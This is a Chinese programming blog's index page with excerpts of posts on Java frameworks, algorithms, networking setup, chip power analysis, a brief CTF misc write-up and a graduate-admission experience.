<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程随想的博客">
		<meta property="og:title" content="编程随想" />
<meta property="og:description" content="编程随想的博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程随想">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d599b971529dc4fb345e0a00f10ed6d/" rel="bookmark">
			【WSN定位】基于加权双曲线的Dvhop定位算法【Matlab代码#16】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 【`获取资源`请见文章第6节：资源获取】1. 原始Dvhop定位2. 基于双曲线的Dvhop定位3. 对原始模型加权4. 部分代码5. 结果展示6. 资源获取7. 参考文献 【获取资源请见文章第6节：资源获取】 1. 原始Dvhop定位 可参考Dvhop定位算法
2. 基于双曲线的Dvhop定位 双曲线定位算法是一种通过将待定位节点定位在以锚节点为焦点、两锚节点之间距离为焦距的双曲线上，根据各双曲线之间的交点确定待定位节点坐标的多边定位算法。待定位节点 u u u与锚节点 i i i之间的距离为：
假设 u u u到锚节点 i i i的距离与到锚节点 j j j的距离之差为 r i j r_{ij} rij​，则有 r i j = d u i − d u j r_{ij}=d_{ui}-d_{uj} rij​=dui​−duj​， u u u位于以锚节点 i i i和 j j j ( j ≠ i ） (j≠i） (j=i）为焦点、到焦点距离差值为r_{ij}的双曲线上。
令 K = x 2 + y 2 K=x^2+y^2 K=x2+y2，带入误差项后可得：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d599b971529dc4fb345e0a00f10ed6d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20b358db7b3356172c3c9d3271e6806c/" rel="bookmark">
			MyBatisPlus使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、MyBatisPlus MyBatisPlus 能大量的节省我们些CRUD的时间，所有的CRUD都能通过MyBatisPlus来自动完成MyBatis Plus 简称 MP 是一个MyBatis的增强工具包，制作增强不做改变，为简化开发，提高生产率而生MyBatis 官网： https://baomidou.com/
MyBatis文档： https://baomidou.com/guide/ 二、快速入门 1.官网： https://baomidou.com/guide/quick-start.html#%E5%88%9D%E5%A7%8B%E5%8C%96%E5%B7%A5%E7%A8%8B
2.创建一个springboot项目，选上lombok,spring web
3.导入mybatis plus 依赖
&lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;version&gt;3.0.5&lt;/version&gt; &lt;/dependency&gt; 4.创建一个表，随便创建一个用户表
5.编写 application.properties 配置文件
# MySQL 5 配置 spring.datasource.username=root spring.datasource.password=0000 spring.datasource.url=jdbc:mysql://localhost:3306/mp spring.datasource.driver-class-name=com.mysql.jdbc.Driver 6.使用MyBatis之后
创建实体类 User
创建UserMapper接口 继承 BaseMapper 【这个Mapper就是Dao】
在UserMapper接口上添加@Repository 注解
在Application主方法类 上添加
//扫描Mapper文件
@MapperScan(“com.xxx.xxx.dao”)
使用
1. 细节 MyBatis和MyBatis-spring 依赖就不要加入到项目中了。MyBatisPlus自动维护
在真实开发中，表的字段一般都会有 version(乐观锁) deleted（逻辑删除） gmt_create(创建时间),gmt_modified(修改时间)
2. 坑： springboot的MySQL start 的mysql依赖版本是 8.0 版本，和电脑上的不匹配的话会报错,所以最好别选mysqlStart，自己添加mysql5.0的依赖
需要在主启动类上去扫描我们的mapper包下所有的接口
@MapperScan(“com.xxx.xxx.dao”)
如果是MySQL8.0的话，那么驱动需修改
spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver 3.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/20b358db7b3356172c3c9d3271e6806c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3bfc37be6ce671801f13de854fd2648c/" rel="bookmark">
			MapDB实现本地缓存
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		public class Caches { //MapDB数据库对象 private DB db; //私有的本类的静态变量 private static Caches cache = null; private static Map map; //初始化本地缓存 private Caches() { boolean flag=init(); if(flag){ TimedTask.updateNeNames(); } } public Boolean init() { //创建数据库数据存储本地文件 File cacheFile = new File("E:/leo/mapdb/test.db"); //创建文件夹目录 cacheFile.getAbsoluteFile().getParentFile().mkdirs(); //创建MapDB数据库对象 db = DBMaker.fileDB(cacheFile) .fileMmapEnable() .checksumHeaderBypass() .make(); //创建Map集合对象，用来存数据 map = db.treeMap("map").keySerializer(Serializer.STRING) .valueSerializer(Serializer.STRING).createOrOpen(); if(!map.isEmpty()){ return true } } public void load() { //业务操作 } //加载数据库的网元，可以定时调用该方法，刷新本地缓存 public void Update() { //将数据库查询的数据写入本地缓存对象 loadNeNames(); } //提供给外部调用的入口 public static Caches getInstance() { //单例模式 if (cache == null) { synchronized (Caches.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3bfc37be6ce671801f13de854fd2648c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/429f30f968ecaf91028cad912acd4e72/" rel="bookmark">
			SpringBoot的配置文件，以及yml语法介绍
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、配置文件 SpringBoot使用一个全局的配置文件，配置文件名是固定的；
•application.properties
•application.yml
配置文件的作用：修改SpringBoot自动配置的默认值；SpringBoot在底层都给我们自动配置好；
YAML（YAML Ain’t Markup Language）
​ YAML A Markup Language：是一个标记语言
​ YAML isn’t Markup Language：不是一个标记语言；
标记语言：
​ 以前的配置文件；大多都使用的是 xxxx.xml文件；
​ YAML：以数据为中心，比json、xml等更适合做配置文件；
​ YAML：配置例子
server: port: 8081 ​ XML：
&lt;server&gt; &lt;port&gt;8081&lt;/port&gt; &lt;/server&gt; 2、YAML语法： 1、基本语法 k:(空格)v：表示一对键值对（空格必须有）；
以空格的缩进来控制层级关系；只要是左对齐的一列数据，都是同一个层级的
server: port: 8081 path: /hello 属性和值也是大小写敏感；
2、值的写法 字面量：普通的值（数字，字符串，布尔） ​ k: v：字面直接来写；
​ 字符串默认不用加上单引号或者双引号；
​ “”：双引号；不会转义字符串里面的特殊字符；特殊字符会作为本身想表示的意思
​ name: “zhangsan \n lisi”：输出；zhangsan 换行 lisi
​ ‘’：单引号；会转义特殊字符，特殊字符最终只是一个普通的字符串数据
​ name: ‘zhangsan \n lisi’：输出；zhangsan \n lisi
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/429f30f968ecaf91028cad912acd4e72/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ca8a02db775ef201f00f67dd8a4b8da/" rel="bookmark">
			Windows11、10，安装最新版ENSP和最新版HCL模拟器教程、无脑下一步！带下载链接
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 软件准备：下载链接：安装步骤： 软件准备： 1、WinPcap_4.1.3.ext
2、VirtualBox-5.2.44-139111
3、eNSP V100R003C00SPC100 Setup.exe
4、HCL_v5.7.1-Setup
下载链接： 移动云盘：下载地址
提取码:4M5Y
安装步骤： 步骤一、安装WinPcap_4.1.3.ext
步骤二、安装VirtualBox-5.2.44-139111
步骤三、eNSP V100R003C00SPC100 Setup.exe
步骤四、修改注册表（该步为关键步骤），不修改后面安装HCL时会报虚拟机不支持的错误。
路径：计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Oracle\VirtualBox。
内容：把Version和VersionExt改为6.0.14
步骤五、安装H3C_5.7.1
不勾选安装VirtualBox（关键步骤）。
步骤六：改回注册表
内容：把Version和VersionExt改为5.2.44
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d5e8db822a30fd69b67bebf9496c5550/" rel="bookmark">
			buuoj 荷兰宽带数据泄露 writeup
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目（二十四）：
【题型】Misc
【题目】荷兰宽带数据泄露
【来源】（buuoj）https://buuoj.cn/challenges#%E8%8D%B7%E5%85%B0%E5%AE%BD%E5%B8%A6%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2
【思路】运用RouterPassView查看密码。
【具体步骤】
Step1：打开发现是一个config.bin文件，根据题目知道是要宽带数据，路由器密码的查看工具是RouterPassView。
Step2：将文件放到RouterPassView下进行查看
Step3：看到这里面的数据还有点多，我们直接搜索password，点击查找，然后输入password，
Step4：将这些密码不断地进行暴力破解，一个一个试，然后发现第二个上面有一个Username，需要将username也放入考虑范围内，结果刚好username的value就是flag。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7c2c671fad82846471ee267515ee772f/" rel="bookmark">
			排序算法C语言代码
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.快速排序
void quicksort(int* a,int left,int right){ if(left&gt;=right)return ; int begin=left,end=right; int pivot=begin,key=a[begin]; while(begin&lt;end){ while(begin&lt;end&amp;&amp;a[end]&gt;=key){ end--; } a[pivot]=a[end]; pivot=end; while(begin&lt;end&amp;&amp;a[begin]&lt;=key){ begin++; } a[pivot]=a[begin]; pivot=begin; } a[pivot]=key; quicksort(a,left,pivot-1); quicksort(a,pivot+1,right); } 2.冒泡排序
void bubble_sort(int* a,int len){ int i,j,temp; for(i=0;i&lt;len-1;i++){ int cnt=0; for(int j=0;j&lt;len-1-i;j++){ if(a[j]&gt;a[j+1]){ temp=a[j]; a[j]=a[j+1]; a[j+1]=temp; cnt=1; } } //一趟下来没有交换任何位置，则证明已排好序 if(cnt==0){ break; } } } 3.插入排序
void insert_sort(int* a,int len){ int i,j,temp; for(int i=1;i&lt;len;i++){ temp=a[i]; j=i-1; while(j&gt;=0&amp;&amp;a[j]&gt;temp){ a[j+1]=a[j]; j--; } a[j+1]=temp; } } 4.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7c2c671fad82846471ee267515ee772f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/46d11badb2866691a5afa0fb995274bc/" rel="bookmark">
			【形形色色的卷积】差分卷积
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 0. 前言1. 中心差分卷积2. 像素差分卷积3. 参考 0. 前言 普通卷积不能显式地提取图像的梯度信息，因此不能较好地描述细粒度的纹理信息，在人脸活体检测、边缘检测等对细粒度纹理信息敏感的任务中难以取得理想的结果。针对上述问题，Oulu大学的研究者们提出了一系列差分卷积，在人脸活体检测和边缘检测等任务中取得了很好的效果。
1. 中心差分卷积 论文：Searching central difference convolutional networks for face anti-spoofing
代码：https://github.com/ZitongYu/CDCN/blob/master/CVPR2020_paper_codes/models/CDCNs.py
Vanilla卷积通常直接聚合局部intensity-level的信息，故 1）容易受到外界光照等因素的影响；2）比较难表征细粒度的特征。在人脸活体检测任务中，前者容易导致模型的泛化能力较弱，如在未知的光照环境下测试性能较低；后者会导致难以学到防伪本质的细节信息，如spoof的材质。考虑到空间差分特征具有较强光照不变性，同时也包含更细粒度的spoof线索（如栅格效应，屏幕反射等），借鉴传统LBP的差分思想，我们提出了中心差分卷积（Central difference convolution, CDC）。
从上图中可以看出中心差分卷积的流程，分为Sampling和Aggregation两步。其中，Sampling是在输入特征图中采样一个patch（尺寸与卷积kernel一致），Aggregation是将patch中的每个元素减去中心元素（与LBP中的差分类似），然后经过普通卷积得到输出。
用公式描述如下：
对于普通卷积：
对于中心差分卷积：
其中， p 0 p_0 p0​表示中心元素位置， p n p_n pn​表示 p 0 p_0 p0​的邻域，若卷积尺寸为3×3，那么 p n p_n pn​为八邻域。为了同时利用Vanilla卷积提取indensity-level和中心差分卷积提取gradient-level信息，引入了参数 θ ∈ [ 0 , 1 ] \theta \in[0,1] θ∈[0,1]作为控制两者重要性程度的权重， θ \theta θ越大表示中心差分卷积的贡献越大。
作者大大也贴心地开源了代码：
class Conv2d_cd(nn.Module): def __init__(self, in_channels, out_channels, kernel_size=3, stride=1, padding=1, dilation=1, groups=1, bias=False, theta=0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/46d11badb2866691a5afa0fb995274bc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/407a5bd0a5e738aa93389ea2643bf675/" rel="bookmark">
			ptpx功耗分析——分析功耗报告
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前面记录了如何跑出正确的功耗数据，有了正确的功耗数据后需要对其进行分析。分析功耗数据首先需要看懂数据报告中的int power、switch power、leakage power都是什么，怎么获得的；其次有一定的分析方法；再次需要懂设计，而懂设计也在功耗优化中十分重要。
1 功耗数据的获得
估计芯片的功耗依据的是库文件的功耗数据和提供的波形文件，而库文件的功耗数据来自fab厂提供的库文件。对于对库文件的理解和熟悉的重要性在备注1里可见。
2 功耗数据中的int power、switch power、leakage power
三种功耗数据中就leakage power清晰简单一点，先从leakage power开始，后面在谈论int power和switch power。
2.1 leakage power
leakage pwoer一般叫做静态功耗，即电路处在有电源供电，该功耗主要由芯片电路的漏电功耗引起，因此又被称作漏电功耗。芯片主要由各种半导体电路组成，而半导体电路在被供电时就一定存在漏电流，因此也就一定存在漏电功耗。而在实际工程中是将电路的输入输出是否变动作为功耗分类的参考，即输入在变化时的功耗成为电路的动态功耗，而输入处于静止不变时的功耗成为静态功耗，因此有如下的表示：
静态功耗=leakage power=leakage_power.lib x static_probability
在使用的库文件中的.lib文件中包含了每个cell处于具体某一种状态的leakage power。因此cell的leakage power为该cell在每种状态下的leakage power的总和，而static_probability由工具根据输入的波形文件统计出来的，即波形文件和波形截取时间一致（即是同一个case的同一个事件起点到同一个事件终点相同的时间长度T和相同的信号状态变化，任何一个不满足都不叫作“一致”），则静态功耗一致。
关于leakage power的理论可以参考如下链接和书籍：
（数字IC）低功耗设计入门（一）——低功耗设计目的与功耗的类型 - IC_learner - 博客园 (cnblogs.com)
《电子技术基础——模拟部分》（第五版 康华光）——了解基础的半导体器件的工作原理也静态功耗的来源基础
关于leakage power在芯片研发阶段的功耗解读可参考如下链接：
芯片功耗分析_input duty_王_嘻嘻的博客-CSDN博客
四月清和雨乍晴，静态功耗乱伊心 (qq.com)
2.2 int power和switch power
动态功耗=int power+switch power
internal power在库文件中有写，switch power在库文件中没有写，但两者均与信号的翻转有关，关于两者的计算和举例可参考如下链接：
芯片功耗分析_input duty_王_嘻嘻的博客-CSDN博客
2018世界杯第一日，撸一遍动态功耗计算 (qq.com)
关于internal power，库文件中有明确的查找表，里面标明了与internal power相关的因素，一般包括intput_net_transition和total_output_net_capacitence。
3 功耗数据的分析方法 （1）按模块整理出功耗的int power、switch power、leakage power，如果时间充足可按照hierarchy一级一级的整理出三种功耗以及每一级对应的综合后的面积。将功耗和case对应分析，看看是否存在case中没有工作的模块却有相应的功耗，如果有功耗，对应波形文件在Verdi里打开看没工作的模块的时钟是否关闭，输入端口是否处于静态——可以采用clock gate的方案降低功耗。将功耗数据结合面积报告一起分析，看各模块的功耗和其面积是否一致，一般情况下面积和功耗成正比，如果不一致，则需要查看原因。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/407a5bd0a5e738aa93389ea2643bf675/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c4661450ea9b64ad70f1d5faa240d861/" rel="bookmark">
			termux的一些问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我的电脑过安检的时候，竟然被卡住，压坏了。没办法，有需要电脑工作。我就用家里的平板电脑工作。我首先安装了termux，但是遇到这些问题。
(1)我在平板电脑上安装了termux后，我想通过手机登陆到平板电脑，但是平板电脑的用户名是多少？
答:whoami
(2)我在平板电脑上打开termux，然后vim ~/a，在里面写东西，这时候发问题来了。怎么输入中文?
答：我折腾了很久，网上搜索了很多资料，最后都没有成功。
(3)我这时我想到办法。我能不能用putty来远程登陆到服务器，这样就可以在终端上输入中文了。
putty没有安卓版的，找了很久终于找到juiceSSH。可以远程登陆，也挺好有的。我本来就是想着远程登陆到服务器，然后在写文档的。用了juiceSSH，可以用平板电脑的输入法，输入中文了。
(4)问题又来了。我在网上下载了很多word文档。我想把这些work文档，复制到vim打开的记事本里面。我反复折腾了很久，都没有成功。怎么弄都没法在word执行ctrl+c，在juicessh里面的vim里面执行ctrl+v。在termux打开的vim也不行。我后面不在终端里面，打开vim，而是直接juicessh或termux里面粘贴，都没有办法。
后面想到，通过命令，把work文档转换成txt，然后再编辑，可是试了很多方法，都没法执行。后面不知道哪里看到，直接点击屏幕，在选择粘贴。我在juicessh和termux里面试了，可以的。
(5)虽然点击屏幕可以粘贴，但是格式有问题。怎么办了，我又想到把work转换成txt文档的方法。我到处搜，看到很多方法，都不靠谱。后面我看到了docx2txt，我试着安装这个命令，果然有。
不过试了，不行，后面找到这个方法：
假设在当前目录下有一个word文档：a.doc，
libreoffice --headless --convert-to txt a.doc
在当前目录下生成一个txt文档：a.txt
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/23755ce85b15d385e67ed84472a6fd5e/" rel="bookmark">
			linux多网卡实现内外网互通
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		需求背景：公司一般是内网模式不做任何外网的链接，但是多数情况需要将服务给其他用户使用，所以需要nginx做服务的代理，只留一台主机实现内外网路的互通。
实现方法：做代理的主机双网卡。
操作步骤：
虚拟机增加成双网卡，分别做成内网网卡（参考步骤2），和外网网卡（参考步骤3）。
步骤1：双网卡设置
虚拟机页面---》编辑---》虚拟网络编辑器 --》更改设置 ---》添加网络
步骤2：内网网卡设置
自动添加的网络需要更改设置才能使得网络达到自己要求，现在开始设置内网网络。
补充一下：192.168.0.xxx代表主机ip段在192.168.0.xxx使用同网卡可以做到网络互访。
主机段不在此网络的及时使用该网卡也无法访问网络。
更改网络类型为仅主机模式，取消 使用本地DHCP服务将IP地址分配给虚拟机，设置子网IP：可自己定义需要的ip符合ip规则即可。子网掩码：225.225.225.0 设置完成即完成内网的设置。点击保持即可。
注意： 此时虚拟机网络是无法进行此ip的链接。
步骤3：外网网卡设置
外网网卡一般采用NAT模式做网络分发的。
设置如上图。
注意：此时本地的操作系统是无法和虚拟机进行网络通信的。如需要本地主机和虚拟机进行通信需要做操作系统网卡设置。
本地电脑网卡设置：
打开网络和internet设置----》更改适配器选项----》找到虚拟机再操作系统的网络网卡
一般通过虚拟网卡名称大体可以看出来如：
右击图标---》属性---》internet协议版本4（TCP/IPv4）---》进行参数设置
说明：系统网卡设置：
IP地址： 设置系统网卡的地址和虚拟机的设置的子网ip要在同一ip段：192.168.207.XXX，但是不能和虚拟机设置的ip地址一样。
子网掩码：默认
默认网关：网段直接进行网络通信的同一地址。设置一个虚拟机不会用到的ip，也不要和系统ip一样。
保存设置。此时双网卡桌面设置已经完成。注意：此时通过工具：xshell、crt等远程链接工具仍然无法远程链接。
步骤4：虚拟机网卡设置
1： 进入虚拟机，未完成设置需要页面操作。打开虚拟机shell终端。
2： 查看网卡配置文件文件 /etc/sysconfig/network-scripts/
步骤5：修改内网网卡配置文件
1：内网网卡设置：
BOOTPROTO：设置为：static
IPADDR：需要和步骤2设置的内网网卡在同一ip段，且不一样。 GATEWAY：内网集群所有的网络通信地址，此ip设置为一个不会用到的ip地址。以后所有的内网虚拟机的所有GATEWAY都需要是这个。
DNS1：DNS寻址地址，学习可以设置默认，一般大公司都有自己的DNS域名系统的地址。
NETMASK：默认：255.255.255.0
2：sudo vi /etc/sysconfig/network
添加：NETWORKING=yes
3：设置DNS广播地址：
sudo vi /etc/resolv.conf
nameserver 8.8.8.8
4:重启网卡配置：
service network restart
5：内网网卡设置完成，此时可以所有内网集群ip段相同的主机进行通信了。
步骤6：修改外网网卡配置文件:
IPADDR：需要和步骤3设置的外网网卡在同一ip段，且不一样。 GATEWAY：外网集群所有的网络通信地址，保持和步骤3系统设置的网关地址一样
其他参考步骤5：
重启网卡配置：
service network restart
此时可以在系统本机通过xshell、crt等远程链接工具进行外网主机ip网络链接了。
如有问题敬请提出，请不吝赐教。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8b47c238f55cedd281bdfe1e1a34b8af/" rel="bookmark">
			word解决文字与公式mathtype不对齐
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		修改字体和段落里面的这两个。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1dc75bdb614bc6757f01f166a62df832/" rel="bookmark">
			[动态规划]——线性DP(LIS/LCS/LCIS等) 详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【引入】 线性DP，是较常见的一类动态规划问题，其是在线性结构上进行状态转移，这类问题不像背包问题、区间DP等有固定的模板
线性动态规划的目标函数为特定变量的线性函数，约束是这些变量的线性不等式或等式，目的是求目标函数的最大值或最小值
因此，除了少量问题（如：LIS、LCS、LCIS等）有固定的模板外，大部分都要根据实际问题来推导得出答案
【常见问题】 (一)序列问题 首先，让我们先了解一下子串、子序列还有公共子序列的概念
(1)字符子串：指的是字符串中连续的n个字符，如abcdefg中，ab，cde，fg等都属于它的字串
(2)字符子序列：指的是字符串中不一定连续但先后顺序一致的n个字符，即可以去掉字符串中的部分字符，但不可改变其前后顺序。如abcdefg中，acdg，bdf属于它的子序列，而bac，dbfg则不是，因为它们与字符串的字符顺序不一致
(3)公共子序列：如果序列C既是序列A的子序列，同时也是序列B的子序列，则称它为序列A和序列B的公共子序列。如对序列 1,3,5,4,2,6,8,7和序列 1,4,8,6,7,5 来说，序列1,8,7是它们的一个公共子序列
1.LIS问题——最长上升子序列 最长上升子序列（Longest Increasing Subsequence），简称LIS，也有些情况求的是最长非降序子序列，二者区别就是序列中是否可以有相等的数，对于固定的数组，虽然LIS序列不一定唯一，但LIS的长度是唯一的
状态设计：dp[i]代表以a[i]结尾的LIS的长度
状态转移：dp[i]=max{dp[j]+1，dp[i]} (1&lt;=j&lt; i，a[j]&lt;a[i])
边界处理：dp[i]=1(1&lt;=i&lt;=n)
时间复杂度：O (n^2)
模板：
#include&lt;iostream&gt; using namespace std; const int N=105; int a[N],dp[N]; int main(){ int n,ans=0; cin&gt;&gt;n; for(int i=1;i&lt;=n;i++){ cin&gt;&gt;a[i]; dp[i]=1; } for(int i=1;i&lt;=n;i++){ for(int j=1; j&lt;i; j++){ if(a[j]&lt;a[i]){ dp[i] = max(dp[i],dp[j]+1); } } ans=max(ans,dp[i]); } cout&lt;&lt;ans; return 0; } 2. LCS问题——最长公共子序列 最长公共子序列，英文缩写为LCS（Longest Common Subsequence）。其定义是，一个序列 S ，如果分别是两个或多个已知序列的子序列，且是所有符合此条件序列中最长的，则 S 称为已知序列的最长公共子序列。对于固定的两个数组，虽然最LCS不一定唯一，但LCS的长度是一定的。查找最长公共子序列与查找最长公共子串的问题不同的地方在于：子序列不需要在原序列中占用连续的位置。最长公共子串（要求连续）和最长公共子序列是不同的
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1dc75bdb614bc6757f01f166a62df832/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8672ae353269db021f7caf0ff35618a/" rel="bookmark">
			2022年电子信息/通信工程保研|四非上岸浙大的保研之旅（浙大、中科大、哈工大、东南、南开、西电、成电等）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
一、个人简介
二、投递/面试情况
三、保研准备
四、面试经历（每个学院具体的入营/面试/录取情况在相应的链接里面）
1、南开大学电子信息与光学工程学院（6.24）
2、吉林大学通信工程学院（6.26）
3、山东大学信息科学与工程学院（7.9）
4、中南大学物理与电子学院（7.10）
5、中国科学技术大学先进技术研究院（7.22）
6、浙江大学工程师学院（8.5）
7、东南大学信息科学与工程学院（8.21）
8、哈工大/哈工深电子与信息工程学院（8.27）
9、天津大学电气自动化与信息工程学院（9.16）
其他（信工所/西电/成电）：
1、中国科学院信息工程研究所
2、西安电子科技大学通信工程学院
3、电子科技大学信息与通信工程学院/通信抗干扰技术国家级重点实验室
五、保研心得体会
1、保研是持久战，文书材料一定要早作准备
2、保研是信息战
3、要找到自己的优势
4、部分学校可以通过提前联系老师增加入营机率
5、简历或报名表上写了的课程要好好复习
6、简历上的论文/竞赛/大创一定要好好准备
7、珍惜PPT面试的机会
六、总结
我是23届也就是2022年保研上岸的，从四非通信工程到浙大工程师学院。
下面的这个回答链接记录了我从22.01—22.09保研期间的详细准备工作以及投递情况下面的文字部分就算经验贴了哈哈，希望能够给电子信息/通信工程专业的小伙伴们一些帮助吧。 2022年夏令营陆续开始，大家都准备的怎么样了？108 赞同 · 56 评论回答正在上传…重新上传取消
一、个人简介 学校及专业：四非通信工程
绩点排名：1/170
CET6：487 CET4：554
科研经历：二区SCI论文1篇，主持重点领域支持国家级大创1项
竞赛奖项：互联网+国铜、挑战杯国铜、节能减排国二、数模美赛M奖；数模国赛、互联网+及创青春省奖若干
其他：中国电信奖学金、两次校一等奖学金；国家级、市级、校级荣誉称号若干。
个人评估：劣势：本科四非，导致申请部分985高校夏令营容易被卡出身；六级分数不高
优势：
l 绩点第一，不容易被卡Rank。专业课复习的较早，基础知识比较扎实。
l 科研经历比较丰富，并且有论文产出，这为我在前期联系导师时提供了很大的帮助，基本上是百发百中并且加上了很多老师的联系方式（除了华科和成电哈，我套了这么多老师都不带回邮件的）。
l 竞赛经历较为丰富，参加创新创业类的PPT大赛比较多，并且都是以大创项目进行的成果转化，使我对科研项目更加熟悉。
面试很多需要做PPT的夏令营/预推免的时候更清楚如何对个人简介、科研项目的图片选取和排版，以达到吸引老师的目的。
l 面试能力较强，不怯场，印象里面最深刻的是面浙大和东南的时候顶住了老师的压力面，没有被老师唬住。并且在9.28的前一个多星期帮助了很多小伙伴进行模拟面试准备最后的冲刺
二、投递/面试情况 夏令营是我的主战场。投递了40+的院校，但是入营却不到三分之一，刚开始的时候真的被拒麻了。（现在各大高校和学生都在当海王，所以在这里提醒双非er一定要海投！海投！海投！重要的事情说三遍！）
夏令营投递的学校but被拒的很惨
浏览器收藏夹里面全是院校的通知官网和报名系统
以防被喷，事先声明拿到梦校offer并且联系好老师后就把其余学校的offer释放了 夏令营情况：南开优营、山大优营、中南优营、吉大未优营、信工所（入了没面，要交的材料太多了）、中科大先研院优营（入营基本都是合格，联系好了老师，过了浙大就放掉了）、西电（过了团队面，放弃学院面）、成电优选（过了团队面，放弃优选资格）、浙大工院优营、东南专硕（排名在计划招生数范围内）、哈工大优营（优营不代表offer，还需要参加面试）
预推免情况：天大合格（只要参加了三批面试都给合格，但是要联系好老师才能去）
最终去向：浙江大学（6人面试中排名第2，比第3名高7分，拿到唯2的offer，另外5人皆为985、211的同学）
三、保研准备 保研的种子自大一开始在心里萌芽，卷绩点卷竞赛卷科研，碌碌三年终于上岸，其中艰难不必多说。幸运的是在我保研期间遇到了许许多多好的老师、朋友、战友以及各种来自知乎和小红薯的小伙伴们，是无数个他们的鼓励和力量汇聚在一起才有了今天成功上岸的我。很喜欢看过的一部美剧里这样的一句话：All your effort will be paid off finally。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8672ae353269db021f7caf0ff35618a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/971bafc1bc069e414fb7f20d08882940/" rel="bookmark">
			数据结构C语言版 —— 二叉树的顺序存储堆的实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 二叉树顺序结构实现(堆)1. 堆的概念2. 堆的基本操作堆的向下调整算法堆的创建堆的向上调整算法 3. 堆的实现堆的创建向堆中插入元素删除堆顶元素获取堆顶元素获取堆中元素个数判断堆是否为空堆的销毁 4. TopK问题 二叉树顺序结构实现(堆) 1. 堆的概念 堆在物理上是一个一维数组，在逻辑上是一颗完全二叉树满足父亲节点小于等于孩子节点的叫做小堆或者小根堆满足父亲节点大于等于孩子节点的叫做大堆或者大根堆 堆的孩子和父亲的下标关系
